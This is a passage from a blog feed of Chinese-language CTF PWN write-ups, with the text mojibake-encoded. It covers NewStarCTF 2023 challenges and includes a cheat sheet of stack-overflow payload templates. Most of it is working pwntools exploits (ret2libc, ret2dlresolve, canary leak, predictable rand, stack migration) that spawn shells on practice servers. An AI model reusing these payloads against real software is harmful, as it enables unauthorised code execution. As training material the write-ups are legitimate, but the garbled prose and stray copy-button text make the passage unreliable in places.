class="number">0x100</span></span><br><span class="line">l_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000040115e</span>    <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000040116b</span>    <span class="comment"># pop rsi ; ret # ç”¨äºè§£æç¬¦å· dl_runtime_resolve</span></span><br><span class="line">plt_load = p64(plt0 + <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr, known_func_ptr, offset</span>):</span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))  <span class="comment"># l_addr</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>)</span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>)</span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, read_got, l_addr)</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span>,</span><br><span class="line">    pop_rdi, <span class="number">0</span>,</span><br><span class="line">    pop_rsi, bss_stage,</span><br><span class="line">    read_plt,</span><br><span class="line">    pop_rsi, <span class="number">0</span>,</span><br><span class="line">    pop_rdi, bss_stage + <span class="number">0x48</span>,</span><br><span class="line">    plt_load, bss_stage, <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(fake_link_map)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="æ€»ç»“">æ€»ç»“ï¼š</span></h1><p>è¿™æ¬¡é¢˜ç›®ç¡®å®ä¸Šäº†ä¸€ä¸ªæ¡£æ¬¡ï¼Œæœ‰äº›ä¸œè¥¿ç¡®å®ä¹Ÿä¸å¤ªå¥½ç†è§£ï¼Œæ…¢æ…¢æ¥ï¼Œç§¯å°‘æˆå¤šï¼Œç›¸åŒé¢˜å‹æ”¾ä¸€èµ·æ€»ç»“ï¼Œæ€»ä¼šå¾—å‡ºå¥½çš„ç»“è®ºï¼Œå°±ä¸€å¥è¯ï¼šå¤šåšå¤šæ€»ç»“ï¼Œå†²å†²å†²ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>NewStarCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN PWN PWN !!! æŠ€å·§ (1)</title>
    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/</url>
    <content><![CDATA[<p>PWN PWN PWN !!! æŠ€å·§ (1)</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹ï¼š</span></h1><p>è®°å½•ä¸€ä¸‹ï¼ŒåŸºç¡€çš„çŸ¥è¯†ç‚¹å’Œä¸€äº›å·¥å…·çš„ç”¨æ³•ï¼Œè§£é¢˜æ¨¡æ¿ç­‰ï¼ˆæœ¬äººè®°æ€§å·®æ—¶ä¸æ—¶ä¼šå¿˜è®°ï¼Œè®°å½•ä¸€ä¸‹ä¸å¤§å®¶å…±å‹‰ï¼‰</p>
<hr>
<h2><span id="32ä½ä¼ å‚">32ä½ä¼ å‚</span></h2><p>32ä½ä¼ å‚çš„æ–¹å¼æ˜¯é€šè¿‡æ ˆæ¥ä¼ å‚çš„ï¼Œä¸æ„é€ çš„payloadä¹Ÿæ˜¯æœ‰å…³çš„ï¼Œå¤§è‡´å¦‚ä¸‹ï¼š(æœ‰æ—¶å€™ä¹Ÿä¼šå˜æ ¹æ®é¢˜ç›®æ„æ€æ¥)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = å¡«å……çš„æ•°æ® + system + åƒåœ¾æ•°æ® + binsh</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="64ä½ä¼ å‚">64ä½ä¼ å‚</span></h2><p>64ä½ä¼ å‚å‰å…­ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨æ¥ä¼ å‚çš„ï¼Œåˆ†åˆ«ä¸º rdiã€rsiã€rdxã€rcxã€r8ã€r9ï¼Œä¹‹åçš„å‚æ•°æ˜¯é€šè¿‡æ ˆä¼ é€’çš„ï¼ŒåŒæ ·æ„é€  payload ä¹Ÿæœ‰ä¸€å¥—ï¼Œä½†è¿˜æ˜¯éœ€è¦å…·ä½“é—®é¢˜å…·ä½“åˆ†æï¼Œå¤§è‡´å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = å¡«å……çš„æ•°æ® + rdi + binsh + system</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="32ä½æ³„éœ²libcä¹‹puts">32ä½æ³„éœ²libcä¹‹puts</span></h2><p>è¿™é‡Œåªå†™æ„é€  payload çš„å¤§ä½“æ¨¡æ¿ï¼Œå…¶ä»–çš„éƒ½æ˜¯é€šå¼åšå¤šäº†å°±çŸ¥é“äº†ï¼ˆå¡«å……çš„æ•°æ®æ˜¯å¯ä»¥å˜çš„å•Šï¼Œmain_addr ä¹Ÿå°±æ˜¯ä½ éœ€è¦è¿”å›çš„åœ°å€ï¼‰</p>
<p><strong>ç¬¬ä¸€æ¬¡ payload æ³„éœ² libcï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(main_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p><strong>ç¬¬äºŒæ¬¡ payload è·å¾— shellï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="64ä½æ³„éœ²libcä¹‹puts">64ä½æ³„éœ²libcä¹‹puts</span></h2><p><strong>ç¬¬ä¸€æ¬¡ payload æ³„éœ² libcï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_addr)</span><br></pre></td></tr></table></figure>

<p><strong>ç¬¬äºŒæ¬¡ payload å¾— shellï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="32ä½æ³„éœ²libcä¹‹write">32ä½æ³„éœ²libcä¹‹write</span></h2><p><strong>ç¬¬ä¸€æ¬¡ payload æ³„éœ² libcï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p><strong>ç¬¬äºŒæ¬¡ payload è·å¾— shellï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="64ä½æ³„éœ²libcä¹‹write">64ä½æ³„éœ²libcä¹‹write</span></h2><p><strong>ç¬¬ä¸€æ¬¡ payload æ³„éœ² libcï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(main_addr)</span><br></pre></td></tr></table></figure>

<p><strong>ç¬¬äºŒæ¬¡ payload å¾— shellï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="æ³„éœ²libcä¹‹æœ‰libcæ–‡ä»¶">æ³„éœ²libcä¹‹æœ‰libcæ–‡ä»¶</span></h2><p>ç»™ fresh pwner æé†’ä¸‹ï¼Œè¿™é‡Œçš„ puts æ˜¯å¯ä»¥æ¢çš„ï¼ˆçœ‹ä½ æ˜¯é€šè¿‡ puts å‡½æ•°æ³„éœ²çš„è¿˜æ˜¯é€šè¿‡ write å‡½æ•°æ³„éœ²çš„ï¼Œé€šè¿‡å“ªä¸ªå†™å“ªä¸ªï¼‰ä»”ç»†è§‚å¯Ÿæœ‰æ—  libc æ–‡ä»¶çš„åŒºåˆ«ï¼ˆå‘ç°æ²¡ä¸­å°æ‹¬å·ä¹Ÿæ˜¯è¦åŒºåˆ†çš„å“¦ï¼Œå¯ä»¥è‡ªå·±è¯•è¯•ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="æ³„éœ²libcä¹‹æ— libcæ–‡ä»¶">æ³„éœ²libcä¹‹æ— libcæ–‡ä»¶</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="canary">Canary</span></h2><p><strong>ç¬¬ä¸€æ¬¡æ³„éœ² libcï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(vuln)</span><br></pre></td></tr></table></figure>

<p><strong>ç¬¬äºŒæ¬¡è·å¾— shellï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh)</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="relro">Relro</span></h2><ol>
<li>RELRO é˜²å¾¡ç­–ç•¥ï¼š<ul>
<li>NO RELROï¼š<code>init.array</code>ã€<code>fini.array</code>ã€<code>got.plt</code> å‡å¯è¯»å¯å†™</li>
<li>PARTIAL RELROï¼š<code>init.array</code>ã€<code>fini.array</code> å¯è¯»ä¸å¯å†™ï¼Œ<code>got.plt</code> å¯è¯»å¯å†™</li>
<li>FULL RELROï¼š<code>init.array</code>ã€<code>fini.array</code>ã€<code>got.plt</code> å‡å¯è¯»ä¸å¯å†™</li>
</ul>
</li>
<li>Linux ç¨‹åºè¿è¡Œæ—¶ï¼š<ul>
<li>åœ¨åŠ è½½çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨ <code>init.array</code> æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</li>
<li>åœ¨ç»“æŸçš„æ—¶å€™ï¼Œä¾æ¬¡è°ƒç”¨ <code>fini.array</code> ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</li>
</ul>
</li>
<li>å½“ç¨‹åºå‡ºç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯è‡³å°‘éœ€è¦å†™ä¸¤æ¬¡æ‰èƒ½å®Œæˆæ”»å‡»ã€‚<ul>
<li>å½“å°‘äºä¸¤ä¸ªè¾“å…¥ç‚¹æ—¶ï¼Œå¯ä»¥è€ƒè™‘æ”¹å†™ <code>fini.array</code> ä¸­çš„å‡½æ•°æŒ‡é’ˆä¸º <code>main</code> å‡½æ•°åœ°å€ï¼Œå¯ä»¥å†æ‰§è¡Œä¸€æ¬¡ <code>main</code> å‡½æ•°ã€‚</li>
<li>ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º 1ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½å†™ä¸€ä¸ªåœ°å€ã€‚</li>
</ul>
</li>
</ol>
<hr>
<h1><span id="æ€»ç»“">æ€»ç»“ï¼š</span></h1><p>å¤šåš pwnï¼Œå¤šæ€»ç»“ï¼ŒåŠ æ²¹ï¼Œå†²å†²å†²ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>æŠ€å·§</category>
        <category>æ–¹æ³•</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>NewStarCTF 2023 [WEEK 2] PWN</title>
    <url>/NewStarCTF%202023%20%5BWEEK%202%5D%20PWN/</url>
    <content><![CDATA[<p>NewStarCTF 2023 [WEEK 2] PWN</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹ï¼š</span></h1><p>ç¬¬äºŒå‘¨é¢˜ç›®ä¸Šéš¾åº¦äº†ï¼Œæœ‰å‡ é¢˜åšçš„æ¯”è¾ƒæ£˜æ‰‹ä¸ä¼šåš &gt;_&lt;ï¼Œå•Šå•Šå•Šï¼ï¼ï¼</p>
<hr>
<h2><span id="ret2libc">ret2libc</span></h2><p>çœ‹é¢˜ç›®åå­— ret2libcï¼Œå°±çŸ¥é“æ˜¯ç»å…¸çš„è€ƒç‚¹ï¼Œæ³„éœ² libcï¼Œä¸æ‡‚å°ä¼™ä¼´å¯ä»¥å»çœ‹è¿™ä¸ªä¸Šé¢å†™çš„å¾ˆè¯¦ç»† <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">Pwn Pwn Pwn!!! æŠ€å·§ï¼ˆ1ï¼‰</a>ï¼Œè€è§„çŸ©æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œåªæ‰“å¼€ NXï¼Œå¹¶ä¸”è¯¥æœ‰çš„éƒ½æœ‰ã€‚</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/1.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/2.png"></p>
<p>IDA åç¼–è¯‘ä¸€ä¸‹ï¼Œå‘ç°æ—  systemï¼Œæ—  binshï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€šè¿‡æ³„éœ² libcï¼Œæ„é€  system å’Œ binshã€‚</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/3.png"></p>
<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./111&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25664</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400698</span></span><br><span class="line">rdi_addr = <span class="number">0x400763</span></span><br><span class="line">ret_addr = <span class="number">0x400506</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Show me your magic again\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># put_addr = u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># print(hex(puts_addr))</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Show me your magic again\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="canary">canary</span></h2><p>ä¸€æ ·æ˜¯ä¸€é“ç»å…¸é¢˜å‹ canaryï¼Œå¼€å¯äº† canary å’Œ NXï¼Œè¿˜æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç»å…¸æ€è·¯å°±æ˜¯é€šè¿‡æ ¼å¼å­—ç¬¦ä¸²å»æ³„éœ² canaryï¼ˆå¦‚æœæ²¡æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œé‚£åªèƒ½é€šè¿‡æº¢å‡ºçš„å½¢å¼å»æ³„éœ² canaryï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦åœ¨ gdb é‡Œé¢æ‰¾åˆ° canary æ˜¯ç¬¬å‡ ä¸ªå‚æ•°ï¼Œè¿è¡Œæ–‡ä»¶å°±å¯ä»¥å‘ç°åç§»æ˜¯ 6ã€‚</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/4.png"></p>
<p>IDA åç¼–è¯‘ä¸€ä¸‹ï¼Œä½ ä¼šå‘ç°æœ‰åé—¨å‡½æ•°ï¼Œå°±ä¸éœ€è¦åƒä¸Šä¸€é¢˜ä¸€æ ·è¦è‡ªå·±æ³„éœ² libc äº†ï¼ŒåŒæ—¶è¿˜æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåˆšå¥½å¯ä»¥å¸®æˆ‘ä»¬æ‰“å°å‡º canary çš„å€¼ã€‚</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/5.png"></p>
<p>æŠŠæ–­ç‚¹æ‰“åœ¨ printfï¼Œgdb è°ƒè¯•å¯»æ‰¾ canary çš„å€¼ï¼Œä½ å°±å¯ä»¥å‘ç° canary æ˜¯ç¬¬åä¸€ä¸ªå‚æ•°ï¼ˆè¿™ä¸ªä½ ä¸ä¼šçœ‹ä¸å‡ºæ¥å§ -_-ï¼‰ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¥—è·¯äº†ã€‚</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/6.png"></p>
<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27406</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401262</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%11$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Oh thanks,There is my gift:\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="secret-number">secret number</span></h2><p>è€è§„çŸ©æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œä¿æŠ¤å…¨å¼€çœ‹ç€æœ‰ç‚¹å“äººï¼Œæ²¡äº‹ä»£ç å®¡è®¡ä¸€ä¸‹ã€‚</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/7.png"></p>
<p>è®¤çœŸä»£ç å®¡è®¡ï¼Œä½ å°±ä¼šå‘ç°åªéœ€è¦è®© v5 ç­‰äº secret å°±å¯ä»¥ç›´æ¥è·å¾— flagï¼Œv5 æ˜¯æˆ‘ä»¬è‡ªå·±è¾“å…¥çš„ï¼Œsecret æ˜¯ä¸€ä¸ªä¼ªéšæœºæ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©æ—¶é—´åšç§å­ï¼Œè¾“å…¥ä¼ªéšæœºæ•°å³å¯ã€‚</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/8.png"></p>
<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pythonå¤åˆ¶ç¼–è¾‘<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28725</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">num1 = libc.rand()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Give me some gift?(0/1)\n&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Guess the number\n&#x27;</span>, <span class="built_in">str</span>(num1))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="stack-migration">stack migration</span></h2><p>åªå¼€å¯äº† NXï¼ŒIDA åç¼–è¯‘ï¼Œå°±ä¼šå‘ç°å­˜åœ¨æº¢å‡ºï¼Œä½†æ˜¯æº¢å‡ºçš„é•¿åº¦åªæœ‰ 0x10ï¼Œä¸å¤Ÿæ„é€  shellcodeï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡æ ˆè¿ç§»æ¥è§£å†³è¿™ä¸€é—®é¢˜ã€‚</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/9.png"></p>
<p>IDA ä¸€ä¸‹ï¼Œä»£ç å®¡è®¡ä¸€ä¸‹ï¼Œä½ ä¼šå‘ç°å¾€ buf é‡Œé¢è¾“å…¥æ•°æ®ï¼Œç„¶åå°±ä¼šæ‰“å°å‡ºæ ˆåœ°å€ï¼Œç„¶åå°±æ˜¯ä¸€ä¸ªç»†èŠ‚éœ€è¦æ³¨æ„ï¼ˆçº¢è‰²æ¡†ä½çš„ï¼‰ï¼Œv2 åœ°å€å°±æ˜¯æ ˆåœ°å€ +8ï¼ˆè¿™é‡Œä½ è¦æ˜ç™½æ ˆæ˜¯æ€ä¹ˆå­˜å‚¨æ•°æ®çš„ï¼Œé«˜åœ°å€åœ¨ä¸‹ï¼Œä½åœ°å€åœ¨ä¸Šï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆåŠ 8çš„åŸå› ï¼‰ï¼Œç¬¬äºŒä¸ª read å‘ç”Ÿäº†æ ˆæº¢å‡ºï¼Œä½†æ˜¯æº¢å‡ºçš„é•¿åº¦ä¸è¶³ä»¥æ„é€  rop é“¾ï¼Œæ‰€ä»¥åªèƒ½è¿›è¡Œæ ˆè¿ç§»ï¼ˆ<code>leave; ret;</code>ï¼Œleave ç›¸å¯¹äºæ˜¯ <code>mov esp, ebp; pop ebp;</code>ï¼Œret æ˜¯ <code>pop eip;</code>ï¼‰è¿™æ ·å°±ç®€å•æ˜äº†äº†ï¼Œä¸‹é¢å°±æ˜¯éœ€è¦æ³¨æ„ä¸€ä¸‹æ¥å—æ•°æ®ï¼ˆæ˜¯å¦æœ‰ç©ºæ ¼ï¼Œè¿™é‡Œæˆ‘è¸©å‘äº† -_-ï¼‰ã€‚</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/10.png"></p>
<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pythonå¤åˆ¶ç¼–è¾‘<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26912</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./111&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span 